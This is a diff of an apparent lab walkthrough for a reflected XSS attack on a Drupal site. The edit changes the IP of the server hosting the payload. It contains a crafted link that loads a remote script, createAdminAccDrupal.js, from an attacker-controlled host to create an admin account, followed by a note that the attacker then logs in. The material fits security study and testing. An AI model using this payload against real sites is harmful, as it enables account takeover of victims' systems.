@@ -27,12 +27,12 @@
 4. [social engineering attack] victim user clicks link
 
     ```
-    http://192.168.5.17/test/rxss.php?q=<script src=http://192.168.5.13/createAdminAccDrupal.js></script>
+    http://192.168.5.17/test/rxss.php?q=<script src=http://192.168.5.15/createAdminAccDrupal.js></script>
     ```
 
     * **NOTES**:
       * `192.168.5.17` - target Drupal site
-      * `192.168.5.13` - web server hosting payload
+      * `192.168.5.15` - web server hosting payload
 
 5. [post exploit] attacker logs into target Drupal site using specified credentials
 
